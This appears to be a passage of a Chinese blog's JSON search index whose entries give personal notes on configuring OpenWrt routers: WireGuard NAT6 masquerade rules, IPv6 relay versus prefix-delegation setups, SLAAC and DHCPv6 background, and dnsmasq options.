<li>\u8bbe\u7f6enft\u89c4\u5219\uff0c\u4ecewg\u63a5\u53e3\u8fdb\u5165\u7684\u6d41\u91cf\u51fa\u53bb\u65f6\u9700\u8981\u8fdb\u884csrc nat\u3002</li> </ol> <pre><code>vim /etc/nftables.d/11-nat6-wg.nft\n\nchain srcnat_ula6_wg0 {\n        type nat hook postrouting priority srcnat; policy accept;\n        oifname \"eth0\" ip6 saddr fdab:2333:2333::/48 counter masquerade comment \"!fw4: ULA masquerade6\"\n}\nchain srcnat_ula6_wg1 {\n        type nat hook postrouting priority srcnat; policy accept;\n        oifname \"eth0\" ip6 saddr fdab:2333:2334::/48 counter masquerade comment \"!fw4: ULA masquerade6\"\n}\n\nservice firewall restart\n</code></pre> <ol> <li>\u5141\u8bb8ULA\u5730\u5740\u8def\u7531\u3002\u867d\u7136\u6211\u4eec\u4e0a\u9762\u5f00\u542f\u4e86SNAT\u662f\u4e0d\u4f1a\u628a\u79c1\u6709\u5730\u5740\u53d1\u9001\u5230\u516c\u7f51\u7684\uff0c\u4f46\u662f\u8def\u7531\u5668\u5bf9\u4e8eULA\u5730\u5740\u4ecd\u7136\u9ed8\u8ba4\u662f\u4e0d\u4f1a\u8fdb\u884c\u8def\u7531\u8f6c\u53d1\u7684\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\u3002\uff08\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\u9632\u706b\u5899postrouting\u89c4\u5219\u662f\u5728\u8fdb\u884c\u8def\u7531\u9009\u62e9\u4e4b\u540e\u751f\u6548\u7684\uff0c\u53c2\u8003netfilter-packet-flow\uff09</li> </ol> <ul> <li>\u5bf9\u4e8ewan6\u53e3\u901a\u8fc7dhcpv6\u4e0a\u7f51\uff0c\u53ea\u9700\u8981\u8bbe\u7f6esourcefilter=0\u3002</li> <li>\u5bf9\u4e8epppoe\u4e0a\u7f51\uff0c\u6ca1\u6709wan6\u63a5\u53e3\uff0c\u6682\u65f6\u8fd8\u4e0d\u77e5\u9053\u600e\u4e48\u914d\u7f6e\u3002</li> </ul> <pre><code>uci set network.wan6.sourcefilter=\"0\"\nuci commit\nifup wan6\n</code></pre> <p>\u53c2\u8003</p> <ul> <li>WireGuard VPN with ULA and NAT6? - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum</li> <li>[OpenWrt Wiki] WireGuard Road-Warrior Configuration<ul> <li>NAT6 through your upstream\u00a0IPv6\u00a0interface when routing\u00a0IPv6\u00a0peer traffic from a ULA (configuration B, or configuration A if the peer only uses a ULA)</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#shadowsocks-libdev","title":"shadowsocks-libdev","text":"<p>[OpenWrt Wiki] Shadowsocks</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6-obsolete","title":"IPv6 (obsolete)","text":"<p>updated</p> <p>2024 update: \u8fd9\u90e8\u5206\u5185\u5bb9\u6bd4\u8f83\u9648\u65e7\u4e86\uff0c\u662f\u6700\u5f00\u59cb\u63a5\u89e6openwrt\u65f6\u5199\u7684\u3002\u73b0\u5728\u5df2\u7ecf\u77e5\u9053\u4e86ipv6\u914d\u7f6e\u53ef\u4ee5\u5206\u4e3a\u6709\u65e0PD\u7684\u60c5\u51b5\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7406\u8bba","title":"\u7406\u8bba","text":"<ul> <li>ICMPv6\u6709\u591a\u79cd\u62a5\u6587\u683c\u5f0f\uff0c\u5927\u4f53\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff0c\u5dee\u9519\u62a5\u6587\u548c\u6570\u636e\u62a5\u6587\u3002ipv6\u4f7f\u7528ICMPv6\u4e2d\u7684\u4e00\u7cfb\u5217\u62a5\u6587RS, RA, NS, NA\uff08R--&gt; router, N--&gt;neighbor, S--&gt;solicitation, A--&gt;advertisement\uff09\u6765\u5b8c\u6210\u5730\u5740\u89e3\u6790(\u901a\u8fc7ip\u83b7\u5f97MAC)\u3001\u90bb\u5c45\u4e0d\u53ef\u8fbe\u68c0\u6d4b\u3001\u5730\u5740\u51b2\u7a81\u68c0\u6d4b\u3001\u5730\u5740\u5206\u914d(SLAAC)\u7b49\u4efb\u52a1\u3002</li> </ul> <ul> <li> <p>SLAAC(Stateless Address Autoconfiguration)\uff1a\u65e0\u72b6\u6001\u7684\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u534f\u8bae\u3002\u4f7f\u7528RA\u8fdb\u884c\u5730\u5740\u914d\u7f6e\uff0c\u7279\u70b9\u662f\u65e0\u72b6\u6001\u7684\u3002</p> <p>\u8be6\u7ec6\uff1a\u4e00\u4e2a\u63a5\u53e3up\u65f6\uff0c\u4f1a\u53d1\u9001\u4e00\u4e2aRS\u62a5\u6587\u8bf7\u6c42\u7f51\u7edc\u524d\u7f00\u3002\u5176\u5b83\u8bbe\u5907\u8fd4\u56de\u4e00\u4e2aRA\u62a5\u6587\u3002\u8bbe\u5907\u901a\u8fc7\u524d\u7f00+EUI64\u81ea\u52a8\u751f\u6210ipv6\u5730\u5740\uff08\u4f20\u7edf\u60c5\u51b5\uff0c\u73b0\u5728 windows\u3001\u624b\u673a \u548c \u4e00\u4e9b\u4f7f\u7528 networkmanager \u7684 linux \u8bbe\u5907\uff0c\u901a\u5e38\u4f1a\u83b7\u5f97\u82e5\u5e72\u4e34\u65f6\u5730\u5740\u3002\u8fd9\u4e9b\u5730\u5740\u662f\u52a8\u6001\u968f\u673a\u7684\uff0c\u548c mac \u6ca1\u6709\u5173\u7cfb\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u7684\u539f\u56e0\u662f\u6709\u4e00\u4e2a ipv6 \u5b89\u5168\u5730\u5740\u673a\u5236\u3002linux \u53ef\u4ee5\u914d\u7f6e\u5173\u95ed\uff09\u3002\u8bbe\u5907\u7684\u9ed8\u8ba4\u7f51\u5173\uff08\u8def\u7531\u8868\u4e2d::\u9879\uff09\u4e5f\u88ab\u8bbe\u7f6e\u4e3a\u54cd\u5e94\u8005\uff0c\u540c\u65f6\u8bbe\u7f6e\u4e00\u4e2a\u7f51\u5173\u7684\u6709\u6548\u65f6\u95f4\u3002\u5176\u5b83\u8bbe\u5907\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u9001\u4e00\u4e2aRA\u62a5\u6587\u3002200-600s</p> </li> </ul> <ul> <li>DHCPv6\u5219\u662f\u6709\u72b6\u6001\u7684\u3002\u76ee\u524d\u4f1a\u6df7\u5408\u4f7f\u7528\u8fd9\u4e24\u4e2a\u534f\u8bae\u6765\u914d\u7f6eipv6\u3002</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wan\u53e3\u4e3adhcp","title":"WAN\u53e3\u4e3adhcp","text":"<p>\u8fd9\u79cd\u60c5\u51b5\uff0c\u8def\u7531\u5668\u4e3a\u4e00\u4e2a\u4e8c\u7ea7\u7684\u8def\u7531\u5668\uff0c\u76f4\u63a5\u8f6c\u53d1WAN\u4f20\u6765\u7684RA\u62a5\u6587\u5373\u53ef\u3002</p> <p>\u4fee\u6539<code>/etc/config/dhcp</code></p> <ul> <li>lan\u548cwan6 \u6dfb\u52a03\u4e2arelay\uff08\u5176\u4e2dwan6\u90e8\u5206\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u6dfb\u52a0\uff09</li> <li>\u8bbe\u7f6e\u4e00\u4e2amaster</li> </ul> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        list ra_flags 'none'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n\nconfig dhcp 'wan6'\n        option interface 'wan'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        option master '1'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9759\u6001ipv6","title":"\u9759\u6001ipv6","text":"<p>\u7406\u8bba\u4e0a\u83b7\u5f97\u4e86\u4e00\u4e2aipv6\u524d\u7f00\u540e\uff0c\u53ef\u4ee5\u81ea\u5df1\u8bbe\u7f6e\u9759\u6001\u7684ipv6\u5730\u5740\uff0c\u57fa\u672c\u4e0d\u4f1a\u548c\u522b\u4eba\u53d1\u751f\u51b2\u7a81\u3002</p> <p>\u53ef\u4ee5\u5728WAN6 interface\u4e2d\u8bbe\u7f6e\u4e3astatic\uff08\u52a8\u6001\u4e3aDHCPv6 client)\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2aipv6\u5730\u5740\u3002</p> <p>\u4ee5\u4e0b\u4e3a\u4fee\u6539\u540e\u7684<code>/etc/config/network</code>\u5185\u5bb9</p> <pre><code>config interface 'wan'\n option device 'wan'\n option proto 'dhcp'\n\nconfig interface 'wan6'\n option device 'wan'\n option proto 'static'\n list ip6addr '2001:da8:d800:611::123d/64'\n option ip6gw '2001:da8:d800:611::1'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wan\u53e3\u4e3apppoe","title":"WAN\u53e3\u4e3apppoe","text":"<p>\u8fd9\u79cd\u60c5\u51b5\uff0c\u4e0d\u80fd\u4f7f\u7528\u4e0a\u9762\u7684\u5168\u90e8\u914d\u7f6e\u4e3arelay\u7684\u65b9\u5f0f\u3002\u521a\u5f00\u59cb\u5168\u90e8\u914d\u7f6e\u4e3arelay\u540e\uff0c\u53d1\u73b0\u8bbe\u5907\u9700\u8981\u5148ping\u4e00\u4e0b\u8def\u7531\u5668\u7684WAN\u53e3ipv6\u5730\u5740\u4e4b\u540e\uff0c\u624d\u80fd\u6b63\u5e38ipv6\u4e0a\u7f51\u3002</p> <p>\u6211\u8fd8\u6ca1\u6709\u641e\u61c2\u662f\u4e3a\u4ec0\u4e48\uff0c\u7ecf\u8fc7\u4e0d\u65ad\u5404\u79cd\u5c1d\u8bd5\u540e\uff0c\u53d1\u73b0\u4ee5\u4e0b\u914d\u7f6e\u6210\u529f\u3002</p> <ul> <li> <p>\u9996\u5148wan\u53e3\u8bbe\u7f6e\u4e3apppoe\u540e\uff0c\u62e8\u53f7\u6210\u529f\u540e\u4f1a\u751f\u6210\u4e00\u4e2aWAN_6\u865a\u62df\u63a5\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06WAN6\u63a5\u53e3\u5220\u6389</p> <p>\uff08\u4ee5\u4e0b\u4e3a\u6700\u7ec8\u6210\u529f\u7684\u622a\u56fe\uff09</p> <p></p> </li> </ul> <ul> <li> <p>\u7136\u540e\u9700\u8981\u5c06WAN\u4e2d\u7684DHCP Server\u8bbe\u7f6e\u4e3a\u5ffd\u7565\uff0c\u4e4b\u540e\u9700\u8981\u914d\u7f6eLAN</p> <p></p> </li> </ul> <ul> <li> <p>LAN\u4e2dRA\u548cDHCPv6\u90fd\u9700\u8981\u8bbe\u7f6e\u4e3aserver</p> <p></p> <p>\u200b \u7136\u540eAdvanced\u4e2d\u9700\u8981\u5f00\u542fDelegate IPv6 prefixes\uff0c\u6700\u7ec8\u6548\u679c\u5c31\u662fLAN\u63a5\u53e3\u4e2d\u4e5f\u51fa\u73b0\u4e86ipv6\u5730\u5740</p> <p></p> </li> </ul> <p>\u8bb0\u5f55\u4e0b\u6700\u540e\u7684\u914d\u7f6e\u6587\u4ef6</p> <p><code>/etc/config/dhcp</code></p> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option dhcpv6 'server'\n        option ra 'server'\n        list ra_flags 'managed-config'\n        list ra_flags 'other-config'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n</code></pre> <p><code>/etc/config/network</code></p> <pre><code>config interface 'lan'\n        option device 'br-lan'\n        option proto 'static'\n        option netmask '255.255.255.0'\n        option ipaddr '192.168.33.1'\n        option ip6assign '60'\n        list ip6class 'wan_6'\n\nconfig interface 'wan'\n        option device 'wan'\n        option proto 'pppoe'\n        option username 'xxx'\n        option password 'xxx'\n        option ipv6 'auto'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6_2","title":"IPv6","text":"<p>IPv6 with OpenWrt - YouTube OpenWRT \u8def\u7531\u5668IPv6\u5b9e\u6218\u914d\u7f6e\u957f\u7bc7\u6559\u7a0b\uff1a\u7ea0\u6b63\u4f60\u7684IPv4\u601d\u7ef4\uff01_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</p> <p>[OpenWrt Wiki] IPv6 configuration</p> <p>ipv6\u914d\u7f6e\u53ef\u4ee5\u5206\u4e3a\u6709\u65e0PD\u7684\u60c5\u51b5\u3002\u6709PD\u7684\u60c5\u51b5\u5982\u679c\u524d\u7f00\u957f\u5ea6=64\uff0c\u90a3\u4e48\u53ea\u80fd\u4e00\u4e2a\u63a5\u53e3\u4f7f\u7528\uff0c\u65e0\u6cd5\u518d\u5f80\u4e0b\u5206\u914dPD\u3002\u5982\u679c&lt;64\uff0c\u5219\u53ef\u4ee5\u7ee7\u7eed\u5206\u914d\u5b50\u7f51\u3002PD\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5f00\u542fRA server\u548cdhcpv6 server\u3002dhcpv6 server\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6eflag\u6765\u63a7\u5236\u662f\u5426\u52a8\u6001\u5206\u914d\u5730\u5740\uff0c\u8fd8\u662f\u8ba9\u8bbe\u5907\u81ea\u5df1SLAAC\u83b7\u5f97\u5730\u5740\u3002\u6709PD\u60c5\u51b5\u662f\u6700\u597d\u7684\u3002</p> <p>\u65e0PD\u60c5\u51b5\u4e0b\uff0c\u6b63\u5e38\u53ea\u6709wan\u53e3\u53ef\u4ee5\u83b7\u5f97ipv6\u5730\u5740\uff0c\u5982\u679c\u8981\u8ba9\u5e95\u4e0b\u8bbe\u5907\u90fd\u83b7\u5f97ipv6\u5730\u5740\uff0copenwrt\u6709\u4e00\u4e2arelay\u529f\u80fd\u3002\u4f46\u662f\u540e\u9762\u53d1\u73b0relay\u6a21\u5f0f\u4e0d\u5982PD\u60c5\u51b5\u597d\uff0c\u4f1a\u6709\u4e00\u4e9b\u95ee\u9898\u3002\u5e38\u89c1\u7684\u6bd4\u5982\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u9700\u8981ping\u4e00\u4e0bwan\u53e3\u624d\u80fd\u8bbf\u95eeipv6\u3002</p> <p>\u56e0\u6b64\u65e0PD\u60c5\u51b5\uff0c\u611f\u89c9\u4f7f\u7528NAT6\u662f\u66f4\u597d\u7684\u9009\u62e9\u3002openwrt luci\u76ee\u524d\u4e0d\u652f\u6301ipv6\u7684\u7aef\u53e3\u8f6c\u53d1\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528iptable6\u547d\u4ee4\u884c</p> <p>\u65e0PD\u60c5\u51b5\u53e6\u5916\u4e00\u79cd\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u901a\u8fc7\u4e8c\u5c42\u7684gre tap\u96a7\u9053\u8fde\u63a5\u5230\u53e6\u4e00\u4e2a\u5206\u914dPD\u7684\u7f51\u7edc\u6765\u83b7\u5f97PD</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#upstream","title":"upstream","text":"<p>PPP-based protocols - for example pppoe and pppoa - require that\u00a0<code>option ipv6</code>\u00a0is specified in the parent\u00a0<code>config interface wan</code>\u00a0section. See\u00a0WAN interface protocols.\u00a0option ipv6\u00a0can take the value:</p> <ul> <li>0: disable\u00a0IPv6\u00a0on the interface</li> <li>1: enable IPCP6 negotiation on the interface, but nothing else. If successful, the parent interface will be assigned a\u00a0link-local address\u00a0(prefix fe80::/10). All other\u00a0IPv6\u00a0configuration is made in the\u00a0<code>wan6</code>\u00a0interface which must be configured manually, as described below.</li> <li>auto: (default) enable\u00a0IPv6\u00a0on the interface. Spawn a virtual interface wan_6 (note the underscore) and start DHCPv6 client odhcp6c to manage prefix assignment. Ensure the lan interface has\u00a0<code>option ip6assign 64</code>\u00a0(or a larger prefix size) set to redistribute the received prefix downstream.</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#downstream","title":"Downstream","text":"<p>OpenWrt features a versatile RA &amp; DHCPv6 server and relay. Per default, SLAAC and both stateless and stateful DHCPv6 are enabled on an interface. If there are any prefixes of size /64 or shorter present then addresses will be handed out from each prefix. If all addresses on an interface have prefixes shorter than /64, then DHCPv6 Prefix Delegation is enabled for downstream routers. If a default route is present, the router advertises itself as default router on the interface.</p> <ul> <li>Server support for Router Advertisement, DHCPv6 (stateless and stateful) and DHCPv6-PD</li> <li>Automatic detection of announced prefixes, delegated prefixes, default routes and\u00a0MTU</li> <li>Change detection for prefixes and routes triggering resending of RAs and DHCPv6-Reconfigure</li> <li>Detection of client hostnames and export as augmented hosts-file</li> <li>Support for RA &amp; DHCPv6-relaying and NDP-proxying to e.g. support uplinks without prefix delegation<ul> <li>\u5982\u679c\u4e0a\u6e38\u4e0d\u652f\u6301PD\uff0c\u90a3\u4e48\u60f3\u8981\u7ed9\u4e0b\u6e38\u5206\u914dipv6\u5c31\u53ea\u80fdrelay\u6216NAT\uff1f</li> </ul> </li> </ul> <p>The system is also able to detect when there is no prefix available from an upstream interface and can switch into relaying mode automatically to extend the upstream interface configuration onto its downstream interfaces. This is useful for putting the target router behind another\u00a0IPv6\u00a0router which doesn't offer prefixes via DHCPv6-PD.</p> <p>\u5173\u4e8e SLAAC \u548c DHCPv6 \u7684\u4ecb\u7ecd\u53ef\u4ee5\u53c2\u8003 IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#slaac-and-dhcpv6","title":"SLAAC and DHCPv6","text":"<p>Example configuration section for SLAAC + DHCPv6 server mode. This is suitable also for a typical 6in4 tunnel configuration, where you specify the fixed\u00a0LAN\u00a0prefix in the tunnel interface config. Make sure to disable NDP-Proxy by removing the\u00a0<code>ndp</code>\u00a0option if any.</p> <pre><code># cat /etc/config/dhcp\nconfig dhcp lan\n    option dhcpv6 server\n    option ra server\n    option ra_flags 'managed-config other-config'\n    ...\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#slaac-only","title":"SLAAC only","text":"<p>Example configuration section for SLAAC alone. Make sure to deactivate RA flags, otherwise clients expect the presence of a DHCPv6 and consequently may fail to activate the network connection. Note that disabling DHCPv6 makes some clients (e.g. Android devices) prefer\u00a0IPv4\u00a0over\u00a0IPv6. <pre><code># cat /etc/config/dhcp\nconfig dhcp lan\n    option dhcpv6 disabled\n    option ra server\n    list ra_flags 'none'\n    ...\n</code></pre></p> <p>\u5b9e\u9645op3 <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option dhcpv6 'server'\n        option ra 'server'\n        option ra_slaac '1'\n        list ra_flags 'managed-config'\n        list ra_flags 'other-config'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n</code></pre></p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6-relay","title":"IPv6 relay","text":"<pre><code># cat /etc/config/dhcp\nconfig dhcp lan\n    option dhcpv6 relay\n    option ra relay\n    option ndp relay\n    ...\n\u00a0\nconfig dhcp wan6\n    option dhcpv6 relay\n    option ra relay\n    option ndp relay\n    option master 1\n    option interface wan6\n</code></pre> <p>wan6\u88ab\u8bbe\u7f6e\u4e3amaster\uff0c\u56e0\u6b64lan\u548cwan6\u5c31\u88ab\u8054\u7cfb\u8d77\u6765\u4e86 - lan\u5185\u7684rs\u4f1a\u88ab\u8f6c\u53d1\u7ed9wan6\u53d1\u51fa - wan6\u7684ra\u8f6c\u53d1\u7ed9lan</p> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        list dhcp_option '6,192.168.35.1'\n        list dhcp_option '3,192.168.35.1'\n        option ra 'relay'\n        option ndp 'relay'\n        option ndproxy_slave '1'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n\nconfig dhcp 'wan6'\n        option interface 'wan6'\n        option ra 'relay'\n        option ndp 'relay'\n        option master '1'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ipv6-\u524d\u7f00\u4e0b\u53d1\u7684\u51e0\u4e2a\u9009\u9879","title":"IPv6 \u524d\u7f00\u4e0b\u53d1\u7684\u51e0\u4e2a\u9009\u9879","text":"<p>\u4e00\u4e0b\u5206\u522b\u662f wan \u53e3\u548c lan \u53e3\u5e38\u89c1\u7684\u8bbe\u7f6e </p> <p></p> <p>\u5176\u4e2d Delegate Ipv6 prefixes \u7684\u4f5c\u7528\u662f\uff0c\u5982\u679c\u6b64\u63a5\u53e3\u6709\u5c0f\u4e8e 64 \u7684\u524d\u7f00\uff0c\u5219\u53ef\u4ee5\u628a\u524d\u7f00\u4e0b\u53d1\u7ed9\u5176\u5b83\u63a5\u53e3\uff0c\u76f8\u5f53\u4e8e\u5212\u5206\u5b50\u7f51\u3002WAN \u53e3\u9700\u8981\u5f00\u542f\u8fd9\u4e2a\u9009\u9879\uff0cLAN \u5f00\u6216\u4e0d\u5f00\u90fd\u53ef\u4ee5\u3002</p> <p>IPv6 assignment length \u8868\u793a\u8fd9\u4e2a\u63a5\u53e3\u9700\u8981\u83b7\u5f97\u4e00\u4e2a\u524d\u7f00\uff08\u4ece\u5176\u5b83\u63a5\u53e3\u6bd4\u5982 wan \u53e3\uff09\uff0c\u53ef\u4ee5\u6307\u5b9a\u9700\u8981\u7684\u957f\u5ea6\u3002\u5982\u679c\u83b7\u5f97 64 \u8868\u793a\u8fd9\u4e2a\u63a5\u53e3\u6240\u5728\u7684\u5b50\u7f51\u4e0d\u80fd\u518d\u5212\u5206\u4e86\u3002\u5982\u679c\u80fd\u83b7\u5f97 60\uff0c\u5219\u8be5\u63a5\u53e3\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u5212\u5206 16 \u4e2a\u5b50\u7f51\u3002prefix filter \u7528\u4e8e\u7b5b\u9009\u4ece\u90a3\u4e2a\u63a5\u53e3\u83b7\u5f97 prefix\uff0c\u4e0d\u6307\u5b9a\u5219\u4f1a\u4f7f\u7528 ULA\u3002</p> <ul> <li><code>ip6assign</code>: Prefix size used for assigned prefix to the interface (e.g. 64 will assign /64-prefixes)</li> <li><code>ip6hint</code>: Subprefix ID to be used if available (e.g. 1234 with an ip6assign of 64 will assign prefixes of the form ...:1234::/64 or given\u00a0LAN\u00a0ports,\u00a0LAN\u00a0&amp; LAN2, and a prefix delegation of /56, use ip6hint of 00 and 80 which would give prefixes of\u00a0LAN\u00a0...:xx00::/64 and LAN2 ...:xx80::/64)</li> <li><code>ip6class</code>: Filter for prefix classes to accept on this interface (e.g.\u00a0<code>wan6</code>\u00a0- only assign prefix from the respective interface,\u00a0<code>local</code>\u00a0- only assign the ULA-prefix)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5173\u4e8e-96-\u4f4d\u524d\u7f00","title":"\u5173\u4e8e 96 \u4f4d\u524d\u7f00","text":"<p>\u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7 DHCPv6 PD \u83b7\u53d6\u4e00\u4e2a \u524d\u7f00\uff0c\u6216\u8005 SLAAC \u83b7\u53d6\u4e00\u4e2a 64 \u4f4d\u524d\u7f00\u3002\u672c\u8d28\u90fd\u662f\u4f60\u62e5\u6709\u4e86\u8fd9\u4e00\u6bb5\u524d\u7f00\u7684\u8def\u7531\u6743\u3002</p> <p>\u5c0f\u4e8e 64 \u7684\u524d\u7f00\uff0c\u53ef\u4ee5 ra\uff0cdhcpv6 server \u5565\u7684\u3002</p> <p>\u5927\u4e8e 64 \u7684\u524d\u7f00\uff0c - \u5c31\u53ea\u80fd dhcpv6 \u4e86\uff0c   - android \u4e0d\u5403 dhcpv6   - openwrt \u754c\u9762\u91cc\u6ca1\u6709\u8bbe\u7f6e  dhcpv6 \u524d\u7f00\u7684\u65b9\u5f0f\u3002\u53ea\u6709\u8fd9\u4e2a\u63a5\u53e3\u4ece PD \u83b7\u5f97\u4e00\u4e2a 64 \u524d\u7f00\u540e\uff0c\u624d\u80fd\u8bbe\u7f6e RA server\uff0cdhcpv6 server \u5565\u7684\u3002\u53ef\u4ee5\u4f7f\u7528 adguardhome\u3002 - \u6216\u8005\u4f7f\u7528 ULA + NAT66\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#dnsdnsmasq","title":"DNS/dnsmasq","text":"<p>dnsmasq\u4e3b\u8981\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/config/dhcp</code> openwrt \u914d\u7f6e\u6587\u4ef6\u6587\u6863\uff1a[OpenWrt Wiki] DNS and DHCP configuration /etc/config/dhcp dnsmasq \u914d\u7f6e\uff1adnsmasq/dnsmasq.conf.example at master \u00b7 imp/dnsmasq (github.com)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5e38\u89c1\u9009\u9879","title":"\u5e38\u89c1\u9009\u9879","text":"<ul> <li><code>noresolv 1</code>: \u4e0d\u4f7f\u7528\u4e0a\u6e38 dns\uff0c\u800c\u53ea\u662f\u7528\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u7684\u4e0a\u6e38 dns\u3002Don't read upstream servers from\u00a0<code>/etc/resolv.conf</code>\u00a0which is linked to\u00a0<code>resolvfile</code>\u00a0by default</li> <li><code>resolvfile /tmp/resolv.conf.d/resolv.conf.auto</code>: \u00a0tells\u00a0dnsmasq\u00a0to use this file to find upstream name servers; it gets created by the\u00a0WAN\u00a0DHCP\u00a0or PPP client.</li> <li><code>option rebind_protection '0'</code>: \u5141\u8bb8\u89e3\u6790\u51fa lan \u5730\u5740\uff0c(2024-02-03) \u73b0\u5728rebind_protection\u662f\u9ed8\u8ba4\u5f00\u542f\u7684\u3002\u56e0\u6b64\u9700\u8981\u663e\u793a\u8bbe\u7f6e\u4e3a0</li> 